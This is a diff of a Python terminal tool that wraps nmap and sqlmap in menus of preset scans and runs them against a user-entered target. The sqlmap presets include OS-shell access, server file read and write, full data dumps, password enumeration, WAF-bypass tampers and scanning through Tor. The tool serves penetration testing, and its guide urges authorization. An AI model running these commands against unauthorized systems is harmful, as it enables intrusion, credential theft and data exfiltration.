+            "5": {"name": "OS Shell Access", "desc": "Get system shell", "cmd": "sqlmap -u {url} --batch --os-shell", "time": "~8 min"},
+            "6": {"name": "SQL Shell Access", "desc": "Interactive SQL", "cmd": "sqlmap -u {url} --batch --sql-shell", "time": "~5 min"},
+            "7": {"name": "File Read", "desc": "Read server files", "cmd": "sqlmap -u {url} --batch --file-read={file}", "time": "~5 min"},
+            "8": {"name": "File Write", "desc": "Write to server", "cmd": "sqlmap -u {url} --batch --file-write={local} --file-dest={remote}", "time": "~5 min"},
+            "9": {"name": "Complete Dump", "desc": "Dump everything", "cmd": "sqlmap -u {url} --batch --dump-all --threads=10", "time": "~30 min"},
+            "10": {"name": "Advanced WAF Bypass", "desc": "Multiple tampers", "cmd": "sqlmap -u {url} --batch --level=3 --risk=2 --tamper=space2comment,between,randomcase", "time": "~10 min"},
+            "11": {"name": "Tor Anonymity", "desc": "Scan through Tor", "cmd": "sqlmap -u {url} --batch --tor --tor-type=SOCKS5 --check-tor", "time": "~15 min"},
+            "12": {"name": "Search Columns", "desc": "Search specific data", "cmd": "sqlmap -u {url} --batch --search -C {column}", "time": "~8 min"},
+            "13": {"name": "Registry Access", "desc": "Windows registry", "cmd": "sqlmap -u {url} --batch --reg-read", "time": "~5 min"},
+            "14": {"name": "Full Enumeration", "desc": "Complete enum", "cmd": "sqlmap -u {url} --batch --level=4 --risk=3 --banner --users --passwords --dbs --tables", "time": "~20 min"},
+            "15": {"name": "Second Order Injection", "desc": "Advanced technique", "cmd": "sqlmap -u {url} --batch --second-url={secondurl}", "time": "~10 min"},
+            "16": {"name": "Custom Injection Point", "desc": "Manual injection", "cmd": "sqlmap -u {url} --batch --prefix=\"')\" --suffix=\"--\"", "time": "~8 min"},
+            "17": {"name": "Ultimate Exploitation", "desc": "All options", "cmd": "sqlmap -u {url} --batch --level=5 --risk=3 --threads=10 --tamper=space2comment --technique=BEUSTQ --dump-all", "time": "~45 min"},
+        }
+        
+        self.display_scan_menu(scans, "sqlmap_hard")
+    
+    def display_scan_menu(self, scans, scan_prefix):
+        scan_table = Table(show_header=True, header_style="bold cyan", box=box.ROUNDED, expand=True)
+        scan_table.add_column("#", style="yellow", width=5, justify="center")
+        scan_table.add_column("🎯 Scan Name", style="green", width=30)
+        scan_table.add_column("📝 Description", width=35)
+        scan_table.add_column("⏱️  Est. Time", width=12, justify="center")
+        
+        for key, value in scans.items():
+            scan_table.add_row(key, value["name"], value["desc"], value.get("time", "varies"))
+        scan_table.add_row("0", "⬅️  Back", "Return to level selection", "")
+        
+        console.print(scan_table)
+        
+        valid_choices = list(scans.keys()) + ["0"]
+        choice = self.validate_input("\n[bold yellow]Select scan type[/bold yellow]", valid_choices)
+        
+        if choice == "0":
+            return
+        
+        if choice in scans:
+            if "nmap" in scan_prefix:
+                target = self.validate_input("\n[bold cyan]Enter target (IP/Domain/Range)[/bold cyan]")
+                command = scans[choice]["cmd"].format(target=target)
+                
+                if "nmap_hard" in scan_prefix:
+                    if not Confirm.ask(f"\n[yellow]⚠️  Estimated time: {scans[choice].get('time', 'unknown')}. Continue?[/yellow]", default=True):
+                        Prompt.ask("\n[yellow]Press Enter to continue[/yellow]")
+                        return
+                
+                self.execute_command(command, f"{scan_prefix}_{scans[choice]['name'].replace(' ', '_')}", target)
+                
+            elif "sqlmap" in scan_prefix:
+                url = self.validate_input("\n[bold cyan]Enter target URL[/bold cyan]")
+                command = scans[choice]["cmd"]
+                
+                if "{cookie}" in command:
+                    cookie = self.validate_input("[cyan]Enter cookie value[/cyan]", allow_empty=True)
+                    command = command.format(url=url, cookie=cookie)
+                elif "{db}" in command:
+                    db = self.validate_input("[cyan]Enter database name[/cyan]")
+                    if "{table}" in command:
+                        table = self.validate_input("[cyan]Enter table name[/cyan]")
+                        command = command.format(url=url, db=db, table=table)
+                    else:
+                        command = command.format(url=url, db=db)
+                elif "{postdata}" in command:
+                    postdata = self.validate_input("[cyan]Enter POST data (e.g., 'id=1&name=test')[/cyan]")
+                    command = command.format(url=url, postdata=postdata)
+                elif "{jsondata}" in command:
+                    jsondata = self.validate_input("[cyan]Enter JSON data[/cyan]")
+                    command = command.format(url=url, jsondata=jsondata)
+                elif "{file}" in command:
+                    file = self.validate_input("[cyan]Enter file path to read[/cyan]")
+                    command = command.format(url=url, file=file)
+                elif "{local}" in command and "{remote}" in command:
+                    local = self.validate_input("[cyan]Enter local file path[/cyan]")
+                    remote = self.validate_input("[cyan]Enter remote destination[/cyan]")
+                    command = command.format(url=url, local=local, remote=remote)
+                elif "{column}" in command:
+                    column = self.validate_input("[cyan]Enter column name to search[/cyan]")
+                    command = command.format(url=url, column=column)
+                elif "{secondurl}" in command:
+                    secondurl = self.validate_input("[cyan]Enter second-order URL[/cyan]")
+                    command = command.format(url=url, secondurl=secondurl)
+                else:
+                    command = command.format(url=url)
+                
+                if "sqlmap_hard" in scan_prefix:
+                    if not Confirm.ask(f"\n[yellow]⚠️  This is aggressive. Estimated time: {scans[choice].get('time', 'unknown')}. Continue?[/yellow]", default=False):
+                        Prompt.ask("\n[yellow]Press Enter to continue[/yellow]")
+                        return
+                
+                self.execute_command(command, f"{scan_prefix}_{scans[choice]['name'].replace(' ', '_')}", url)
+            
+            Prompt.ask("\n[yellow]Press Enter to continue[/yellow]")
+    
+    def quick_scan_profiles(self, scan_type):
+        self.clear_screen()
+        self.show_banner()
+        
+        console.print("\n")
+        console.print(Align.center(f"[bold cyan]⭐ QUICK SCAN PROFILES - {scan_type.upper()}[/bold cyan]"))
+        console.print("\n")
+        
+        if scan_type == "nmap":
+            profiles = {
+                "1": {"name": "Web Server Audit", "desc": "Complete web server scan", "cmd": "nmap -sS -sV -p 80,443,8080,8443 --script=http-* {target}"},
+                "2": {"name": "Database Server Audit", "desc": "All database ports", "cmd": "nmap -sV -p 1433,1521,3306,5432,27017 --script=*sql*,mongodb* {target}"},
+                "3": {"name": "Mail Server Audit", "desc": "Email server scan", "cmd": "nmap -sV -p 25,110,143,465,587,993,995 --script=smtp-*,pop3-*,imap-* {target}"},
+                "4": {"name": "Windows Domain Audit", "desc": "AD and SMB scan", "cmd": "nmap -sV -p 88,135,139,389,445,636 --script=smb-*,ldap-* {target}"},
+                "5": {"name": "Network Infrastructure", "desc": "Routers and switches", "cmd": "nmap -sU -sV -p 161,162,514 --script=snmp-* {target}"},
+                "6": {"name": "Cloud Services", "desc": "Common cloud ports", "cmd": "nmap -sV -p 22,80,443,3389,5985,5986 {target}"},
             }
-            
-            for report in reports:
-                report_data = {
-                    'id': report[0],
-                    'name': report[1],
-                    'target': report[2],
-                    'scan_type': report[3],
-                    'mode': report[4],
-                    'created_date': report[5],
-                    'file_path': report[6],
-                    'notes': report[7] if len(report) > 7 else '',
-                    'status': report[8] if len(report) > 8 else 'completed',
-                    'duration': report[9] if len(report) > 9 else 0,
-                    'vulnerability_count': report[10] if len(report) > 10 else 0,
-                    'risk_score': report[11] if len(report) > 11 else 0
-                }
-                export_data['reports'].append(report_data)
-            
-            with open(filepath, 'w', encoding='utf-8') as f:
-                json.dump(export_data, f, indent=2, ensure_ascii=False)
-            
-            return filepath
-        except Exception:
-            return None
-
-class AdvancedScanExecutor:
-    def __init__(self, db_manager):
-        self.db_manager = db_manager
-        self.active_scans = {}
-        self.scan_lock = threading.Lock()
-    
-    def execute_scan(self, scan_type, target, command, progress_callback=None, timeout=300):
-        try:
-            if scan_type.lower() == 'nmap':
-                full_command = ['nmap'] + command.split() + [target]
-            elif scan_type.lower() == 'sqlmap':
-                full_command = ['sqlmap', '-u', target] + command.split()
+        else:
+            profiles = {
+                "1": {"name": "WordPress Audit", "desc": "WordPress SQL injection", "cmd": "sqlmap -u {url} --batch --level=2 --risk=2 --random-agent"},
+                "2": {"name": "REST API Test", "desc": "API injection test", "cmd": "sqlmap -u {url} --batch --method=POST --headers=\"Content-Type: application/json\""},
+                "3": {"name": "Login Form Test", "desc": "Authentication bypass", "cmd": "sqlmap -u {url} --batch --forms --level=3 --risk=2"},
+                "4": {"name": "Cookie Injection", "desc": "Session cookie test", "cmd": "sqlmap -u {url} --batch --cookie={cookie} --level=2"},
+                "5": {"name": "Blind SQL Test", "desc": "Time-based blind", "cmd": "sqlmap -u {url} --batch --technique=T --level=3"},
+                "6": {"name": "Error-Based Quick", "desc": "Error-based injection", "cmd": "sqlmap -u {url} --batch --technique=E --level=2"},
+            }
+        
+        profile_table = Table(show_header=True, header_style="bold magenta", box=box.ROUNDED, expand=True)
+        profile_table.add_column("#", style="yellow", width=5, justify="center")
+        profile_table.add_column("⭐ Profile Name", style="green", width=30)
+        profile_table.add_column("📝 Description", width=40)
+        
+        for key, value in profiles.items():
+            profile_table.add_row(key, value["name"], value["desc"])
+        profile_table.add_row("0", "⬅️  Back", "Return to menu")
+        
+        console.print(profile_table)
+        
+        valid_choices = list(profiles.keys()) + ["0"]
+        choice = self.validate_input("\n[bold yellow]Select profile[/bold yellow]", valid_choices)
+        
+        if choice == "0":
+            return
+        
+        if choice in profiles:
+            if scan_type == "nmap":
+                target = self.validate_input("\n[bold cyan]Enter target[/bold cyan]")
+                command = profiles[choice]["cmd"].format(target=target)
+                self.execute_command(command, f"nmap_profile_{profiles[choice]['name'].replace(' ', '_')}", target)
             else:
-                return False, "Unsupported scan type"
+                url = self.validate_input("\n[bold cyan]Enter target URL[/bold cyan]")
+                command = profiles[choice]["cmd"]
+                if "{cookie}" in command:
+                    cookie = self.validate_input("[cyan]Enter cookie value[/cyan]", allow_empty=True)
+                    command = command.format(url=url, cookie=cookie)
+                else:
+                    command = command.format(url=url)
+                self.execute_command(command, f"sqlmap_profile_{profiles[choice]['name'].replace(' ', '_')}", url)
             
-            start_time = time.time()
+            Prompt.ask("\n[yellow]Press Enter to continue[/yellow]")
+    
+    def show_user_guide(self):
+        self.clear_screen()
+        self.show_banner()
+        
+        guide_md = """
+# 📚 User Guide
+
+## 🎯 Overview
+Security Scan Automator is a comprehensive penetration testing tool that automates network scanning and SQL injection testing.
+
+## 🔍 Scan Levels
+
+### ⚡ Easy Level
+- **Purpose**: Quick reconnaissance and basic testing
+- **Speed**: Fast execution (seconds to minutes)
+- **Risk**: Low detection risk
+- **Best For**: Initial assessment, network discovery
+
+### 🔧 Medium Level
+- **Purpose**: Standard penetration testing
+- **Speed**: Moderate execution (minutes)
+- **Risk**: Medium detection risk
+- **Best For**: Regular security assessments
+
+### 🔥 Hard Level
+- **Purpose**: Deep security analysis
+- **Speed**: Slow execution (tens of minutes to hours)
+- **Risk**: High detection risk, may trigger IDS/IPS
+- **Best For**: Comprehensive security audits
+
+## 🔧 Features
+
+### Network Scanning (Nmap)
+- Port scanning and service detection
+- Operating system fingerprinting
+- Vulnerability assessment
+- Network topology mapping
+- SSL/TLS analysis
+- Web server enumeration
+
+### SQL Injection Testing (SQLMap)
+- Automated injection detection
+- Database enumeration
+- Data extraction
+- Privilege escalation testing
+- WAF bypass techniques
+
+### Export Options
+- **JSON**: Machine-readable format
+- **CSV**: Spreadsheet-compatible
+- **HTML**: Professional reports
+
+### Quick Profiles
+Pre-configured scan combinations for:
+- Web servers
+- Database servers
+- Mail servers
+- Windows domains
+- Cloud infrastructure
+
+## 📁 Log Management
+All scans are logged to `logs/` directory:
+- JSON format with metadata
+- Complete command output
+- Timestamp and duration tracking
+- Searchable history
+
+## ⚠️ Best Practices
+1. **Always get authorization** before scanning
+2. Start with Easy level scans
+3. Review logs after each scan
+4. Be aware of scan duration estimates
+5. Use Hard level only when necessary
+6. Consider legal and ethical implications
+
+## 🚀 Quick Start
+1. Check dependencies in main menu
+2. Select scanner type (Nmap/SQLMap)
+3. Choose difficulty level
+4. Enter target information
+5. Review results and export if needed
+
+## 🔐 Security Notes
+- Some scans require root/sudo privileges
+- Aggressive scans may trigger security systems
+- Always scan responsibly and ethically
+- Keep your tools updated
+
+## 🐛 Troubleshooting
+- **Permission denied**: Use sudo for privileged scans
+- **Command not found**: Install nmap/sqlmap
+- **Scan timeout**: Increase timeout or use faster timing
+- **Network issues**: Check connectivity and firewall rules
+
+## 📞 Support
+Created by @mikropsoft
+Use responsibly and ethically!
+        """
+        
+        console.print(Panel(Markdown(guide_md), title="[bold cyan]📚 User Guide[/bold cyan]", border_style="cyan", expand=False))
+        Prompt.ask("\n[yellow]Press Enter to continue[/yellow]")
+    
+    def view_logs(self):
+        self.clear_screen()
+        self.show_banner()
+        
+        console.print("\n")
+        console.print(Align.center("[bold cyan]📁 SCAN LOGS & HISTORY[/bold cyan]"))
+        console.print("\n")
+        
+        log_files = sorted(self.log_dir.glob("*.log"), key=os.path.getmtime, reverse=True)
+        
+        if not log_files:
+            console.print(Panel(
+                "[yellow]No scan logs found yet.[/yellow]\n\n"
+                "Run some scans to see results here!",
+                title="[bold yellow]Empty History[/bold yellow]",
+                border_style="yellow"
+            ))
+            Prompt.ask("\n[yellow]Press Enter to continue[/yellow]")
+            return
+        
+        log_table = Table(show_header=True, header_style="bold magenta", box=box.ROUNDED, expand=True)
+        log_table.add_column("#", style="yellow", width=5, justify="center")
+        log_table.add_column("📄 Filename", style="cyan", width=35)
+        log_table.add_column("📅 Date", style="green", width=20)
+        log_table.add_column("📦 Size", style="white", width=12, justify="right")
+        
+        for idx, log_file in enumerate(log_files[:25], 1):
+            mod_time = datetime.datetime.fromtimestamp(log_file.stat().st_mtime)
+            size = log_file.stat().st_size
+            size_str = f"{size/1024:.1f} KB" if size > 1024 else f"{size} B"
+            log_table.add_row(str(idx), log_file.name, mod_time.strftime("%Y-%m-%d %H:%M:%S"), size_str)
+        
+        console.print(log_table)
+        console.print(f"\n[cyan]📊 Total logs: {len(log_files)}[/cyan]")
+        console.print("[cyan]📋 Showing latest 25 logs[/cyan]" if len(log_files) > 25 else "")
+        
+        if Confirm.ask("\n[yellow]View a specific log?[/yellow]", default=False):
+            try:
+                log_num = self.validate_input("[cyan]Enter log number[/cyan]")
+                log_num = int(log_num)
+                if 1 <= log_num <= min(len(log_files), 25):
+                    log_file = log_files[log_num - 1]
+                    with open(log_file, 'r') as f:
+                        content = f.read()
+                    
+                    preview_length = 3000
+                    content_preview = content[:preview_length] + "\n\n[yellow]...(content truncated, check file for full output)[/yellow]" if len(content) > preview_length else content
+                    
+                    console.print("\n")
+                    console.print(Panel(
+                        content_preview,
+                        title=f"[bold green]📄 {log_file.name}[/bold green]",
+                        border_style="green",
+                        expand=False
+                    ))
+                else:
+                    console.print("[red]❌ Invalid log number[/red]")
+            except (ValueError, Exception) as e:
+                console.print(f"[red]❌ Error: {str(e)}[/red]")
+        
+        Prompt.ask("\n[yellow]Press Enter to continue[/yellow]")
+    
+    def scan_statistics(self):
+        self.clear_screen()
+        self.show_banner()
+        
+        console.print("\n")
+        console.print(Align.center("[bold cyan]📊 SCAN STATISTICS[/bold cyan]"))
+        console.print("\n")
+        
+        if not self.scan_history:
+            console.print(Panel(
+                "[yellow]No scan history available.[/yellow]\n\n"
+                "Statistics will appear after you run some scans.",
+                title="[bold yellow]No Data[/bold yellow]",
+                border_style="yellow"
+            ))
+            Prompt.ask("\n[yellow]Press Enter to continue[/yellow]")
+            return
+        
+        scan_types = defaultdict(int)
+        total_duration = 0
+        targets = set()
+        
+        for scan in self.scan_history:
+            scan_types[scan.get('scan_type', 'unknown')] += 1
+            total_duration += scan.get('duration', 0)
+            if scan.get('target'):
+                targets.add(scan['target'])
+        
+        stats_table = Table(show_header=True, header_style="bold magenta", box=box.HEAVY, expand=True)
+        stats_table.add_column("📊 Metric", style="cyan", width=30)
+        stats_table.add_column("📈 Value", style="green", width=40)
+        
+        stats_table.add_row("Total Scans", str(len(self.scan_history)))
+        stats_table.add_row("Unique Targets", str(len(targets)))
+        stats_table.add_row("Total Duration", f"{total_duration:.2f} seconds ({total_duration/60:.1f} minutes)")
+        stats_table.add_row("Average Duration", f"{total_duration/len(self.scan_history):.2f} seconds" if self.scan_history else "0")
+        stats_table.add_row("Most Recent Scan", self.scan_history[-1].get('timestamp', 'Unknown')[:19] if self.scan_history else "None")
+        
+        console.print(stats_table)
+        
+        console.print("\n")
+        console.print("[bold cyan]🎯 Scan Type Distribution:[/bold cyan]\n")
+        
+        type_table = Table(show_header=True, header_style="bold magenta", box=box.ROUNDED, expand=True)
+        type_table.add_column("Scan Type", style="cyan", width=40)
+        type_table.add_column("Count", style="green", width=20, justify="center")
+        
+        for scan_type, count in sorted(scan_types.items(), key=lambda x: x[1], reverse=True):
+            type_table.add_row(scan_type, str(count))
+        
+        console.print(type_table)
+        
+        Prompt.ask("\n[yellow]Press Enter to continue[/yellow]")
+    
+    def network_info(self):
+        self.clear_screen()
+        self.show_banner()
+        
+        console.print("\n")
+        console.print(Align.center("[bold cyan]🌐 NETWORK INFORMATION[/bold cyan]"))
+        console.print("\n")
+        
+        self.animate_loading("Gathering network information...", 1)
+        
+        network_data = self.get_network_info()
+        
+        console.print(Panel(
+            network_data,
+            title="[bold green]Network Configuration[/bold green]",
+            border_style="green",
+            expand=False
+        ))
+        
+        Prompt.ask("\n[yellow]Press Enter to continue[/yellow]")
+    
+    def install_system_command(self):
+        self.clear_screen()
+        self.show_banner()
+        
+        console.print("\n")
+        console.print(Align.center("[bold cyan]🔧 SYSTEM INSTALLATION[/bold cyan]"))
+        console.print("\n")
+        
+        console.print(Panel(
+            "[bold yellow]This will install the tool system-wide[/bold yellow]\n\n"
+            "After installation, you can run the tool from anywhere using:\n"
+            "[bold cyan]secscan[/bold cyan]\n\n"
+            "[yellow]Installation steps:[/yellow]\n"
+            "1. Create executable script\n"
+            "2. Copy to /usr/local/bin/ (requires sudo)\n"
+            "3. Set execute permissions\n\n"
+            "[red]Note: Requires sudo privileges[/red]",
+            title="[bold cyan]Installation Guide[/bold cyan]",
+            border_style="cyan"
+        ))
+        
+        if not Confirm.ask("\n[yellow]Proceed with installation?[/yellow]", default=False):
+            return
+        
+        try:
+            current_file = Path(__file__).resolve()
+            target_path = Path("/usr/local/bin/secscan")
             
-            process = subprocess.Popen(
-                full_command,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
-                text=True,
-                universal_newlines=True
+            console.print("\n[cyan]📋 Copying file...[/cyan]")
+            result = subprocess.run(
+                ["sudo", "cp", str(current_file), str(target_path)],
+                capture_output=True,
+                text=True
             )
             
-            output_lines = []
-            error_lines = []
-            ports_found = 0
-            vulnerabilities_found = 0
+            if result.returncode != 0:
+                console.print(f"[red]❌ Copy failed: {result.stderr}[/red]")
+                Prompt.ask("\n[yellow]Press Enter to continue[/yellow]")
+                return
             
-            while True:
-                output = process.stdout.readline()
-                if output == '' and process.poll() is not None:
-                    break
-                if output:
-                    line = output.strip()
-                    output_lines.append(line)
-                    
-                    # Count ports and vulnerabilities
-                    if 'open' in line.lower() and ('tcp' in line.lower() or 'udp' in line.lower()):
-                        ports_found += 1
-                    if any(keyword in line.lower() for keyword in ['vuln', 'vulnerable', 'exploit']):
-                        vulnerabilities_found += 1
-                    
-                    if progress_callback:
-                        progress_callback(line)
+            console.print("[green]✅ File copied successfully[/green]")
             
-            stderr_output = process.stderr.read()
-            if stderr_output:
-                error_lines.extend(stderr_output.split('\n'))
+            console.print("\n[cyan]🔐 Setting permissions...[/cyan]")
+            result = subprocess.run(
+                ["sudo", "chmod", "+x", str(target_path)],
+                capture_output=True,
+                text=True
+            )
             
-            end_time = time.time()
-            duration = end_time - start_time
+            if result.returncode != 0:
+                console.print(f"[red]❌ Permission setting failed: {result.stderr}[/red]")
+                Prompt.ask("\n[yellow]Press Enter to continue[/yellow]")
+                return
             
-            result = '\n'.join(output_lines)
-            if error_lines:
-                result += '\n\nERRORS:\n' + '\n'.join(filter(None, error_lines))
+            console.print("[green]✅ Permissions set successfully[/green]")
             
-            # Add to scan history
-            self.db_manager.add_scan_to_history(target, scan_type, "unknown", ' '.join(full_command), result, duration, ports_found, vulnerabilities_found)
+            console.print("\n")
+            console.print(Panel(
+                "[bold green]✅ Installation completed successfully![/bold green]\n\n"
+                "You can now run the tool from anywhere using:\n"
+                "[bold cyan]secscan[/bold cyan]\n\n"
+                "[yellow]To uninstall:[/yellow]\n"
+                "[cyan]sudo rm /usr/local/bin/secscan[/cyan]",
+                title="[bold green]Success![/bold green]",
+                border_style="green"
+            ))
             
-            return True, {
-                'output': result,
-                'duration': duration,
-                'ports_found': ports_found,
-                'vulnerabilities_found': vulnerabilities_found
-            }
-            
-        except subprocess.CalledProcessError as e:
-            error_msg = f"Command execution error: {e}"
-            self.db_manager.log_error("ScanExecution", error_msg)
-            return False, error_msg
-        except FileNotFoundError:
-            error_msg = f"{scan_type} tool not found"
-            self.db_manager.log_error("ToolNotFound", error_msg)
-            return False, error_msg
         except Exception as e:
-            error_msg = f"Unexpected error: {e}"
-            self.db_manager.log_error("UnexpectedError", error_msg)
-            return False, error_msg
-
-class SecScanAutomator:
-    def __init__(self):
-        try:
-            self.config_manager = ConfigManager()
-            self.db_manager = DatabaseManager()
-            self.report_manager = ReportManager(self.db_manager)
-            self.scan_executor = AdvancedScanExecutor(self.db_manager)
-            self.current_theme = self.config_manager.get('theme', 'dark')
-        except Exception as e:
-            print(f"{Colors.RED}Initialization error: {e}{Colors.END}")
-            sys.exit(1)
+            console.print(f"\n[bold red]❌ Installation failed: {str(e)}[/bold red]")
+        
+        Prompt.ask("\n[yellow]Press Enter to continue[/yellow]")
     
-    def display_logo(self):
-        try:
-            logo = f"""
-{Colors.BRIGHT_CYAN}
-██████ ███████  ██████ ███████  ██████  █████  ███    ██ 
-██     ██      ██     ██      ██      ██   ██ ████   ██ 
-███████ █████   ██     ███████ ██      ███████ ██ ██  ██ 
-     ██ ██      ██          ██ ██      ██   ██ ██  ██ ██ 
-██████  ███████  ██████ ███████  ██████ ██   ██ ██   ████ 
-{Colors.END}
-{Colors.BRIGHT_YELLOW}     🛡️  ADVANCED SECURITY SCANNING AUTOMATOR  🛡️{Colors.END}
-{Colors.BRIGHT_MAGENTA}              Professional Penetration Testing Suite{Colors.END}
-{Colors.GRAY}                          by @microzort{Colors.END}
-"""
-            print(logo)
-            
-            stats = self.db_manager.get_scan_statistics()
-            print(f"{Colors.CYAN}═══════════════════════════════════════════════════════════════{Colors.END}")
-            print(f"{Colors.WHITE}Total Scans: {Colors.GREEN}{stats['total_scans']}{Colors.END} | "
-                  f"{Colors.WHITE}Reports: {Colors.YELLOW}{stats['total_reports']}{Colors.END} | "
-                  f"{Colors.WHITE}Vulnerabilities: {Colors.RED}{stats['total_vulnerabilities']}{Colors.END}")
-            print(f"{Colors.CYAN}═══════════════════════════════════════════════════════════════{Colors.END}")
-            
-        except Exception:
-            print("SecScan Automator - Advanced Security Scanner")
-    
-    def display_quote_of_day(self):
-        try:
-            quote = QuoteGenerator.get_daily_quote()
-            print(f"\n{Colors.YELLOW}{Icons.STAR} Quote of the Day:{Colors.END}")
-            print(f"{Colors.CYAN}\"{quote}\"{Colors.END}")
-        except Exception:
-            pass
-    
-    def display_main_menu(self):
-        try:
-            self.clear_screen()
-            self.display_logo()
-            self.display_quote_of_day()
-            
-            print(f"\n{Colors.BOLD}{Icons.GEAR} MAIN CONTROL PANEL{Colors.END}")
-            print(f"{Colors.CYAN}┌─────────────────────────────────────────────────────────────┐{Colors.END}")
-            
-            menu_items = [
-                ("1", Icons.SCAN, "Nmap Network Scanner"),
-                ("2", Icons.SHIELD, "SQLmap Injection Tester"), 
-                ("3", Icons.CHART, "Reports & Analytics"),
-                ("4", Icons.TARGET, "Target Management"),
-                ("5", Icons.GEAR, "User Profile & Stats"),
-                ("6", Icons.KEY, "Settings & Configuration"),
-                ("7", Icons.EXPORT, "Export & Backup"),
-                ("8", Icons.BOOK, "Help & Documentation"),
-                ("0", Icons.ERROR, "Exit Application")
-            ]
-            
-            for num, icon, desc in menu_items:
-                if num == "0":
-                    print(f"{Colors.RED}{num}.{Colors.END} {icon} {desc}")
-                else:
-                    print(f"{Colors.GREEN}{num}.{Colors.END} {icon} {desc}")
-            
-            print(f"{Colors.CYAN}└─────────────────────────────────────────────────────────────┘{Colors.END}")
-            
-            username = self.config_manager.get('username', 'SecScanUser')
-            total_scans = self.config_manager.get('total_scans', 0)
-            
-            print(f"\n{Colors.CYAN}{Icons.INFO} User: {Colors.YELLOW}{username}{Colors.END} | "
-                  f"{Colors.CYAN}Config Scans: {Colors.YELLOW}{total_scans}{Colors.END}")
-            
-        except Exception:
-            print("Main menu display error")
-    
-    def get_menu_choice(self, max_option):
+    def main_menu(self):
         while True:
-            try:
-                choice = input(f"\n{Colors.WHITE}{Icons.ARROW} Select option (0-{max_option}): ").strip()
-                is_valid, result = InputValidator.validate_menu_choice(choice, max_option)
-                
-                if is_valid:
-                    return result
-                else:
-                    print(f"{Colors.RED}{Icons.ERROR} {result}. Please try again.{Colors.END}")
-                    
-            except (KeyboardInterrupt, EOFError):
-                print(f"\n{Colors.YELLOW}{Icons.WARNING} Operation cancelled{Colors.END}")
-                return 0
-            except Exception as e:
-                print(f"{Colors.RED}{Icons.ERROR} Input error: {e}{Colors.END}")
-    
-    def handle_main_menu_choice(self, choice):
-        try:
-            if choice == 1:
-                return self.nmap_menu()
-            elif choice == 2:
-                return self.sqlmap_menu()
-            elif choice == 3:
-                return self.reports_menu()
-            elif choice == 4:
-                return self.target_management_menu()
-            elif choice == 5:
-                return self.profile_menu()
-            elif choice == 6:
-                return self.settings_menu()
-            elif choice == 7:
-                return self.export_backup_menu()
-            elif choice == 8:
-                return self.help_menu()
-            elif choice == 0:
-                return False
-            else:
-                print(f"{Colors.RED}{Icons.ERROR} Invalid choice!{Colors.END}")
-                time.sleep(1)
-                return True
-        except Exception as e:
-            self.db_manager.log_error("MainMenuChoice", str(e))
-            print(f"{Colors.RED}{Icons.ERROR} Menu error: {e}{Colors.END}")
-            time.sleep(2)
-            return True
-    
-    def nmap_menu(self):
-        try:
-            if not self._check_tool_availability('nmap'):
-                return True
-            
-            while True:
-                self.clear_screen()
-                print(f"\n{Colors.BOLD}{Icons.SCAN} NMAP NETWORK SCANNER{Colors.END}")
-                print(f"{Colors.CYAN}Professional network discovery and security auditing{Colors.END}")
-                
-                print(f"\n{Colors.GREEN}1.{Colors.END} {Icons.STAR} Easy Mode - Quick Discovery")
-                print(f"{Colors.YELLOW}2.{Colors.END} {Icons.FIRE} Medium Mode - Comprehensive Scan")
-                print(f"{Colors.RED}3.{Colors.END} {Icons.ROCKET} Hard Mode - Advanced Penetration")
-                print(f"{Colors.CYAN}0.{Colors.END} {Icons.ARROW} Back to Main Menu")
-                
-                choice = self.get_menu_choice(3)
-                
-                if choice == 1:
-                    self.run_nmap_scan_mode('easy')
-                elif choice == 2:
-                    self.run_nmap_scan_mode('medium')
-                elif choice == 3:
-                    self.run_nmap_scan_mode('hard')
-                elif choice == 0:
-                    break
-        except Exception as e:
-            self.db_manager.log_error("NmapMenu", str(e))
-        
-        return True
-    
-    def sqlmap_menu(self):
-        try:
-            if not self._check_tool_availability('sqlmap'):
-                return True
-            
-            while True:
-                self.clear_screen()
-                print(f"\n{Colors.BOLD}{Icons.SHIELD} SQLMAP INJECTION TESTER{Colors.END}")
-                print(f"{Colors.CYAN}Advanced SQL injection detection and exploitation{Colors.END}")
-                
-                print(f"\n{Colors.GREEN}1.{Colors.END} {Icons.STAR} Basic SQL Injection Test")
-                print(f"{Colors.YELLOW}2.{Colors.END} {Icons.FIRE} Advanced Injection Techniques")
-                print(f"{Colors.RED}3.{Colors.END} {Icons.ROCKET} Expert Exploitation Mode")
-                print(f"{Colors.CYAN}0.{Colors.END} {Icons.ARROW} Back to Main Menu")
-                
-                choice = self.get_menu_choice(3)
-                
-                if choice == 1:
-                    self.run_sqlmap_scan_mode('easy')
-                elif choice == 2:
-                    self.run_sqlmap_scan_mode('medium')
-                elif choice == 3:
-                    self.run_sqlmap_scan_mode('hard')
-                elif choice == 0:
-                    break
-        except Exception as e:
-            self.db_manager.log_error("SqlmapMenu", str(e))
-        
-        return True
-    
-    def run_nmap_scan_mode(self, mode):
-        try:
-            templates = ScanTemplates.get_templates('nmap', mode)
-            
-            if not templates:
-                print(f"{Colors.YELLOW}{Icons.WARNING} No templates found for this mode{Colors.END}")
-                self.wait_for_key()
-                return
-            
-            while True:
-                self.clear_screen()
-                
-                mode_colors = {'easy': Colors.GREEN, 'medium': Colors.YELLOW, 'hard': Colors.RED}
-                mode_color = mode_colors.get(mode, Colors.WHITE)
-                
-                print(f"\n{Colors.BOLD}{Icons.GEAR} NMAP - {mode_color}{mode.upper()} MODE{Colors.END}")
-                print(f"{Colors.CYAN}Select a scan template to execute{Colors.END}")
-                
-                for i, template in enumerate(templates, 1):
-                    print(f"{Colors.GREEN}{i:2d}.{Colors.END} {template['name']}")
-                    print(f"     {Colors.GRAY}{template['description']}{Colors.END}")
-                
-                print(f"{Colors.CYAN}0.{Colors.END} {Icons.ARROW} Back to Nmap Menu")
-                
-                choice = self.get_menu_choice(len(templates))
-                
-                if choice == 0:
-                    break
-                elif 1 <= choice <= len(templates):
-                    selected_template = templates[choice - 1]
-                    self.execute_nmap_scan(selected_template, mode)
-                
-        except Exception as e:
-            self.db_manager.log_error("NmapScanMode", str(e))
-    
-    def run_sqlmap_scan_mode(self, mode):
-        try:
-            templates = ScanTemplates.get_templates('sqlmap', mode)
-            
-            if not templates:
-                print(f"{Colors.YELLOW}{Icons.WARNING} No templates found for this mode{Colors.END}")
-                self.wait_for_key()
-                return
-            
-            while True:
-                self.clear_screen()
-                
-                mode_colors = {'easy': Colors.GREEN, 'medium': Colors.YELLOW, 'hard': Colors.RED}
-                mode_color = mode_colors.get(mode, Colors.WHITE)
-                
-                print(f"\n{Colors.BOLD}{Icons.GEAR} SQLMAP - {mode_color}{mode.upper()} MODE{Colors.END}")
